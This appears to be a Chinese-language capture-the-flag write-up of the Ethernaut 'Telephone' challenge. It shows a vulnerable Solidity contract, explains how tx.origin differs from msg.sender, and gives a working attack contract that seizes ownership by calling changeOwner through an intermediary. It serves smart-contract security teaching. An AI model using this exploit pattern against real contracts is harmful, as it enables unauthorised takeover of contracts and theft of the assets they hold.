# Telephone

## 要求

```
获得下面合约来完成这一关

  这可能有用

参阅帮助页面,在 "Beyond the console" 部分
```
## 代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## 漏洞
`tx.origin != msg.sender) `.
这个主要是观察tx.origin和msg.sender的区别。

- 外部账户 (EOA) 调用合约 A：
    - 在合约 A 中，tx.origin 和 msg.sender 都是 EOA 的地址。

- 合约 A 调用合约 B：
   - 在合约 B 中，tx.origin 仍然是 EOA 的地址，但 msg.sender 现在是合约 A 的地址。

- 合约 B 调用合约 C：
   - 在合约 C 中，tx.origin 仍然是 EOA 的地址，但 msg.sender 现在是合约 B 的地址。
## 解决代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract TelephonePwn{
    address public _target;
    address public owner;
    constructor(address target_){
        _target = target_;
        owner = msg.sender;
    }

    function pwn()public {
        address(_target).call(abi.encodeWithSignature("changeOwner(address)", address(owner)));

    }   
    
}
```
